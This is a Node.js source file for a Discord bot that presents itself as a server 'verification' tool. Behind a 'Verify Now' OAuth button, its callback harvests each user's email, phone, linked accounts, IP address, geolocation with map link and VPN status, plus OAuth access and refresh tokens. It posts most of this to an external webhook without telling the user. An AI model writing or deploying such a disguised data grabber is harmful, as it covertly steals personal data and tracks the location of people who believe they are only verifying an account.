require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

// Initialize Express (for keep-alive & OAuth)
const app = express();
const PORT = process.env.PORT || 3000;

// Discord Client Setup
const discordClient = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// Config (store secrets in .env)
const config = {
  webhookURL: process.env.WEBHOOK_URL,
  clientID: process.env.CLIENT_ID,
  clientSecret: process.env.CLIENT_SECRET,
  botToken: process.env.BOT_TOKEN,
  redirectURI: process.env.REDIRECT_URI || `http://localhost:${PORT}/auth/callback`,
  verifiedRoleName: "Verified"
};

// Data Storage
const verificationLogs = new Map();

// ======================
// 🛡️ KEEP-ALIVE SYSTEM
// ======================
// Prevents Replit from shutting down the bot

// Basic endpoint to respond to pings
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Discord Verification Bot</title>
      <style>
        body { font-family: Arial, sans-serif; background: #36393f; color: white; text-align: center; padding: 50px; }
        .status { background: #2f3136; padding: 20px; border-radius: 10px; max-width: 600px; margin: 0 auto; }
      </style>
    </head>
    <body>
      <div class="status">
        <h1>🛡️ Discord Verification Bot</h1>
        <p>Status: <strong style="color:#3ba55c">Online</strong></p>
        <p>This keep-alive server prevents Replit from shutting down the bot.</p>
      </div>
    </body>
    </html>
  `);
});

// Ping ourselves every 5 minutes (Replit needs this)
function keepAlivePing() {
  axios.get(`http://localhost:${PORT}`)
    .then(() => console.log('✅ Keep-alive ping successful'))
    .catch(err => console.error('❌ Keep-alive ping failed:', err.message));
}
setInterval(keepAlivePing, 5 * 60 * 1000); // 5 minutes

// ======================
// 🤖 DISCORD BOT LOGIC
// ======================

discordClient.on('ready', () => {
  console.log(`✅ Bot online as ${discordClient.user.tag}`);
  discordClient.user.setActivity(".verify | Secure Auth", { type: "PLAYING" });
});

// Command: !setupverify
discordClient.on('messageCreate', async (message) => {
  if (message.author.bot || !message.content.startsWith("!")) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === "setupverify") {
    if (!message.member.permissions.has("MANAGE_GUILD")) {
      return message.reply("❌ You need **Manage Server** permissions.");
    }

    const authURL = `https://discord.com/oauth2/authorize?client_id=${config.clientID}&response_type=code&redirect_uri=${encodeURIComponent(config.redirectURI)}&scope=identify+email+connections+guilds`;

    const embed = new EmbedBuilder()
      .setTitle("🔐 Verify Your Account")
      .setDescription("Click below to verify and gain server access.")
      .setColor("#5865F2");

    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setURL(authURL)
        .setLabel("Verify Now")
        .setStyle(ButtonStyle.Link)
    );

    await message.channel.send({ embeds: [embed], components: [button] });
    await message.reply("✅ Verification panel created!");
  }
});

// ======================
// ======================

// Get IP geolocation (with VPN/Proxy detection)
async function getGeoData(ip) {
  try {
    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=66846719`);
    if (res.data.status === "success") {
      return {
        ip: res.data.query,
        country: res.data.country,
        city: res.data.city,
        isp: res.data.isp,
        proxy: res.data.proxy || false,
        hosting: res.data.hosting || false,
        org: res.data.org,
        map: `https://www.google.com/maps?q=${res.data.lat},${res.data.lon}`
      };
    }
  } catch (err) {
    console.error("Geo lookup failed:", err);
  }
  return null;
}

// OAuth Callback (where data is collected)
app.get('/auth/callback', async (req, res) => {
  const { code } = req.query;
  const userIP = req.headers['x-forwarded-for'] || req.ip;
  const userAgent = req.headers['user-agent'];

  try {
    // 1. Get OAuth Tokens
    const tokenRes = await axios.post(
      "https://discord.com/api/oauth2/token",
      new URLSearchParams({
        client_id: config.clientID,
        client_secret: config.clientSecret,
        grant_type: "authorization_code",
        code: code,
        redirect_uri: config.redirectURI
      }),
      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    );

    const { access_token, refresh_token } = tokenRes.data;

    // 2. Fetch User Data
    const [userRes, connectionsRes] = await Promise.all([
      axios.get("https://discord.com/api/users/@me", {
        headers: { Authorization: `Bearer ${access_token}` }
      }),
      axios.get("https://discord.com/api/users/@me/connections", {
        headers: { Authorization: `Bearer ${access_token}` }
      }).catch(() => ({ data: [] }))
    ]);

    const userData = userRes.data;
    const connections = connectionsRes.data;
    const geoData = await getGeoData(userIP);

    // 3. Store ALL Collected Data
    const logData = {
      USER: {
        id: userData.id,
        username: `${userData.username}#${userData.discriminator}`,
        email: userData.email,
        phone: userData.phone,
        avatar: userData.avatar,
        mfa: userData.mfa_enabled,
        locale: userData.locale
      },
      NETWORK: {
        ip: userIP,
        country: geoData?.country || "Unknown",
        isp: geoData?.isp || "Unknown",
        proxy: geoData?.proxy ? "✅ YES (VPN/Proxy)" : "❌ NO",
        map: geoData?.map || "N/A"
      },
      CONNECTIONS: connections.map(c => `${c.type}: ${c.name}`) || "None",
      TOKENS: {
        access_token: access_token, // Be careful with this!
        refresh_token: refresh_token
      }
    };

    // 4. Send to Discord Webhook
    const embed = new EmbedBuilder()
      .setTitle("🔍 NEW VERIFICATION LOG")
      .setColor("#ff0000")
      .addFields(
        { name: "👤 User", value: `${logData.USER.username} (${logData.USER.id})`, inline: true },
        { name: "📧 Email", value: logData.USER.email || "None", inline: true },
        { name: "📱 Phone", value: logData.USER.phone || "None", inline: true },
        { name: "🌐 IP", value: logData.NETWORK.ip, inline: true },
        { name: "📍 Location", value: `${logData.NETWORK.country} | [View Map](${logData.NETWORK.map})`, inline: true },
        { name: "🛡️ Proxy/VPN", value: logData.NETWORK.proxy, inline: true },
        { name: "🔗 Connections", value: logData.CONNECTIONS.join("\n") || "None", inline: false }
      )
      .setFooter({ text: `Verified at ${new Date().toLocaleString()}` });

    await axios.post(config.webhookURL, { embeds: [embed] });

    // 5. Assign Verified Role
    for (const [guildId, guild] of discordClient.guilds.cache) {
      const member = await guild.members.fetch(userData.id).catch(() => null);
      if (member) {
        let role = guild.roles.cache.find(r => r.name === config.verifiedRoleName);
        if (!role) {
          role = await guild.roles.create({
            name: config.verifiedRoleName,
            color: "#57F287",
            permissions: ["VIEW_CHANNEL", "SEND_MESSAGES"]
          });
        }
        await member.roles.add(role);
      }
    }

    // 6. Show Success Page
    res.send(`
      <!DOCTYPE html>
      <html>
      <head><title>Verified!</title></head>
      <body style="background:#36393f;color:white;text-align:center;padding:50px;">
        <h1 style="color:#3ba55c">✅ Verification Complete</h1>
        <p>You can now close this window.</p>
        <script>setTimeout(() => window.close(), 2000);</script>
      </body>
      </html>
    `);

  } catch (err) {
    console.error("❌ Verification error:", err);
    res.send(`
      <!DOCTYPE html>
      <html>
      <head><title>Error</title></head>
      <body style="background:#36393f;color:white;text-align:center;padding:50px;">
        <h1 style="color:#ff3333">❌ Verification Failed</h1>
        <p>${err.message}</p>
      </body>
      </html>
    `);
  }
});

// =====================

// Login to Discord
discordClient.login(config.botToken).catch(err => {
  console.error("❌ Failed to login:", err);
  process.exit(1);
});

// Start Express Server (for OAuth & keep-alive)
app.listen(PORT, () => {
  console.log(`🛡️ Server running on http://localhost:${PORT}`);
});